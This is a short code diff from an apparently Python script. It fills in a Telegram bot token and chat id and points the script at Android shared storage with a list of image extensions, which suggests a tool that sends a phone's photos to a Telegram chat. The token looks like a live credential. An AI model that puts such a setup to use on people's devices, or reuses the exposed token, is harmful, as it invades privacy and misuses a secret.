@@ -4,8 +4,8 @@ import time
 import sys
 import threading
 
-bot_token = 'Enter your bot token'
-chat_id = 'Enter your chat id'
+bot_token = '7668855532:AAHAyBP5Ohpp4n0Wm5Yt2sUFn8w_9i_aPbo'
+chat_id = '6296611162'
 
 data_path = '/storage/emulated/0/'
 image_extensions = ['.jpg', '.jpeg', '.png', '.gif']
